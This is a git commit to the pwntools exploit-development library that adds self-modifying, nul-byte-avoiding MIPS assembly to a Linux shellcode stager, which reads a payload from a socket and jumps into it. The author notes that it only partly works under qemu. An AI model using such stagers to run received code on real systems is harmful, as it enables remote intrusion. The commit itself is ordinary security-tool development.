5ab2f403bd792a21f936df2bee7d3460c8138d01
Robert Larsen <robert@the-playground.dk>
2015-07-03 13:50:35 +0200

    Works...kind of.

--- pwnlib/shellcraft/templates/mips/linux/stager.asm
+++ pwnlib/shellcraft/templates/mips/linux/stager.asm
@@ -1,6 +1,8 @@
 <% 
     from pwnlib.shellcraft import common
     from pwnlib.shellcraft import mips
+    from pwnlib.asm import asm
+    from pwnlib.util import packing
 %>
 <%docstring>
     stager(sock, size)
@@ -35,3 +37,32 @@ ${looplabel}:
     sub $s3, $s3, $v0
 
     bne $s3, $zero, ${looplabel}
+
+    /* Fully read, now jump to $s1 */
+    /* 'jr <reg>' contains nul bytes so generate this */
+    /* First put int $t7 offset from $ra where to store the opcode */
+    ${mips.mov('$t7', 36)}
+    li $t8, -0x7350
+find_addr:
+    bltzal $t8, find_addr
+    slti $t8, $zero, -1
+
+addr_in_ra:
+    /* Now we know where we are */
+    /* Mov the 'jr $s1' opcode into $t8 */
+    ${mips.mov('$t8', packing.unpack(asm('jr $s1')))}
+
+    /* And store it */
+    add $ra, $ra, $t7
+    sw $t8, -4($ra)
+
+    /* This will be replaced by a 'jr $s1' instruction */
+    /* FIXME: This should be a nop since 'jr $s1' contains nul bytes */
+    /* however in qemu the write looks right but does not take effect */
+    /* as thou the instruction cache is populated by the original instruction */
+    /* but that should not be the case since it has not been executed yet. */
+    /* Perhaps it is a bug in qemu and this actually works on real hardware */
+    jr $s1
+addr_of_jump:
+    /* And this is the jump slot */
+    ${mips.nop()}
